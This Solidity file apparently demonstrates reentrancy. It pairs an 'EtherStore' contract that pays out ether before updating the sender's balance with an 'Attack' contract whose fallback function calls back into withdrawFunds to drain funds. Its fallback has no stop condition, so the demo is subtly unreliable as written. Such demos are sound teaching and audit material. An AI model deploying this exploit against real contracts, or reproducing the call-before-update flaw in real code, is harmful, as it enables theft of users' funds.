pragma solidity^0.6.12;

contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);

        require(_weiToWithdraw <= withdrawalLimit);

        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        (bool success, ) = msg.sender.call{value:_weiToWithdraw}("");
        require(success);
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }

    function withdrawFundsToAddress (uint256 _weiToWithdraw, address _to) public {
        require(balances[msg.sender] >= _weiToWithdraw);

        require(_weiToWithdraw <= withdrawalLimit);

        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        (bool success, ) = _to.call{value:_weiToWithdraw}("");
        require(success);
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }

}


contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attackEtherStore() public payable {
        require(msg.value >= 1 ether);

        etherStore.depositFunds{value:1 ether}();

        etherStore.withdrawFunds(1 ether);
    }

    function collectEther() public {
        msg.sender.transfer(1 ether);
    }

    fallback() payable external {
        etherStore.withdrawFunds(1 ether);
    }
}